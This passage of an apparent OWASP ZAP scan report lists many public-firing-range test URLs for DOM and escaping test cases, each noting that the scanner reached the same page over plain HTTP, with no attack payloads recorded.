* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/function/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/function/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/function/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/function/innerHtml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/function/innerHtml`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/function/innerHtml`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/property/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/property/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/external/localStorage/property/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/array/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/array/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/array/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/function/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/function/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/function/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/function/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/function/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/function/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/function/innerHtml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/function/innerHtml`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/function/innerHtml`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/property/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/property/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/external/sessionStorage/property/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/localStorage/array
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/localStorage/array`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/localStorage/array`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/localStorage/array/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/localStorage/array/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/localStorage/array/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/localStorage/function
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/localStorage/function`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/localStorage/function`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/localStorage/function/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/localStorage/function/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/localStorage/function/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/localStorage/function/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/localStorage/function/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/localStorage/function/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/localStorage/function/innerHtml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/localStorage/function/innerHtml`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/localStorage/function/innerHtml`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/localStorage/property
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/localStorage/property`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/localStorage/property`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/localStorage/property/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/localStorage/property/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/localStorage/property/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/postMessage/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/postMessage/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/postMessage/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/postMessage/improperOriginValidationWithPartialStringComparison
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/postMessage/improperOriginValidationWithPartialStringComparison`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/postMessage/improperOriginValidationWithPartialStringComparison`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/postMessage/improperOriginValidationWithRegExp
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/postMessage/improperOriginValidationWithRegExp`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/postMessage/improperOriginValidationWithRegExp`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/array
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/array`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/array`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/array/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/array/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/array/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/function
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/function`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/function`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/function/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/function/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/function/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/function/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/function/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/function/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/function/innerHtml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/function/innerHtml`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/function/innerHtml`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/property
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/property`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/property`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/property/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/property/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/sessionStorage/property/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/window/name
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/window/name`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/window/name`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/window/name/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/window/name/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/window/name/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/window/name/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/window/name/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/window/name/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdom/window/name/innerHtml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdom/window/name/innerHtml`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdom/window/name/innerHtml`
* URL: https://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/array/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/array/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/array/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/function/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/function/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/function/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/function/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/function/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/function/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/function/innerHtml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/function/innerHtml`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/function/innerHtml`
* URL: https://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/property/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/property/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdomscripts/localStorage/property/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/array/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/array/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/array/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/function/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/function/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/function/documentWrite`
* URL: https://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/function/eval
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/function/eval`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/function/eval`
* URL: https://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/function/innerHtml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/function/innerHtml`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/function/innerHtml`
* URL: https://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/property/documentWrite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/property/documentWrite`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/dom/toxicdomscripts/sessionStorage/property/documentWrite`
* URL: https://public-firing-range.appspot.com/escape
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape`
* URL: https://public-firing-range.appspot.com/escape/index.html
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/index.html`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/index.html`
* URL: https://public-firing-range.appspot.com/escape/js/encodeURIComponent%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/js/encodeURIComponent?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/js/encodeURIComponent?q=a`
* URL: https://public-firing-range.appspot.com/escape/js/escape%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/js/escape?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/js/escape?q=a`
* URL: https://public-firing-range.appspot.com/escape/js/html_escape%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/js/html_escape?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/js/html_escape?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_name%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_name?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_name?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_quoted%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_quoted?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_quoted?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_script%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_script?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_script?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_singlequoted%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_singlequoted?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_singlequoted?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_unquoted%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_unquoted?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/attribute_unquoted?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/body%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/body?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/body?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/body_comment%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/body_comment?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/body_comment?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/css_import%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/css_import?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/css_import?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/css_style%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/css_style?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/css_style?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/css_style_font_value%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/css_style_font_value?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/css_style_font_value?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/css_style_value%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/css_style_value?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/css_style_value?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/head%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/head?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/head?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_assignment%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_assignment?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_assignment?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_comment%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_comment?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_comment?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_eval%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_eval?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_eval?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_quoted_string%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_quoted_string?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_quoted_string?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_singlequoted_string%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_singlequoted_string?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_singlequoted_string?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_slashquoted_string%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_slashquoted_string?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/js_slashquoted_string?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/tagname%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/tagname?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/tagname?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/encodeUrl/textarea%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/encodeUrl/textarea?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/encodeUrl/textarea?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_name%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_name?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_name?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_quoted%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_quoted?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_quoted?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_script%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_script?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_script?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_singlequoted%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_singlequoted?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_singlequoted?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_unquoted%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_unquoted?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/attribute_unquoted?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/body%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/body?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/body?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/body_comment%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/body_comment?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/body_comment?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_import%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_import?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_import?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_style%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_style?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_style?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_style_font_value%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_style_font_value?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_style_font_value?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_style_value%3Fescape=HTML_ESCAPE&q=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_style_value?escape=HTML_ESCAPE&q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/css_style_value?escape=HTML_ESCAPE&q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/head%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/head?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/head?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_assignment%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_assignment?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_assignment?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_comment%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_comment?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_comment?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_eval%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_eval?q=a`
  * Other Info: `ZAP attempted to connect via: http://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_eval?q=a`
* URL: https://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_quoted_string%3Fq=a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `http://public-firing-range.appspot.com/escape/serverside/escapeHtml/js_quoted_string?q=a`
